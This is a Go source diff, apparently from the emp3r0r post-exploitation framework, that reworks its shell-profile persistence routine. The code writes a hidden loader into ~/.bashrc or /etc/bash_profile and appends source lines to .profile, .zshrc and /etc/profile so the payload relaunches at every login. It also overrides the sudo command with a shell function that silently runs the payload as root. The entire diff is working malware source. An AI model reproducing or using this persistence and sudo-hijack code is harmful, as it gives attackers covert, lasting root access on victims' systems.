@@ -118,7 +118,12 @@ func profiles() (err error) {
 	}
 
 	// source
+	bashprofile := fmt.Sprintf("%s/.bashrc", user.HomeDir)
 	sourceCmd := "source ~/.bashprofile"
+	if HasRoot() {
+		bashprofile = "/etc/bash_profile"
+		sourceCmd = "source /etc/bash_profile"
+	}
 
 	// call this to start emp3r0r
 	payload := exe
@@ -135,7 +140,7 @@ func profiles() (err error) {
 	}
 
 	// loader
-	loader := "export PERSISTENCE=true\nset +m;%s 2>/dev/null"
+	loader := fmt.Sprintf("export PERSISTENCE=true\n%s 2>/dev/null", payload)
 
 	// exec our payload as root too!
 	// sudo payload
@@ -145,16 +150,8 @@ func profiles() (err error) {
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
 	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s 2>/dev/null)) }", sudoPayload)
-	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
+	err = ioutil.WriteFile(bashprofile, []byte(loader), 0644)
 	if err != nil {
-		if !util.IsExist(user.HomeDir) {
-			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
-			if err != nil {
-				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
-			}
-			err = util.AppendTextToFile("/etc/profile", "source /etc/bash_profile")
-			return fmt.Errorf("This user has no home dir: %v", err)
-		}
 		return
 	}
 
@@ -172,7 +169,7 @@ func profiles() (err error) {
 	_ = util.AppendTextToFile(user.HomeDir+"/.profile", sourceCmd)
 	_ = util.AppendTextToFile(user.HomeDir+"/.bashrc", sourceCmd)
 	_ = util.AppendTextToFile(user.HomeDir+"/.zshrc", sourceCmd)
-	_ = util.AppendTextToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")
+	_ = util.AppendTextToFile("/etc/profile", "source "+bashprofile)
 
 	return
 }
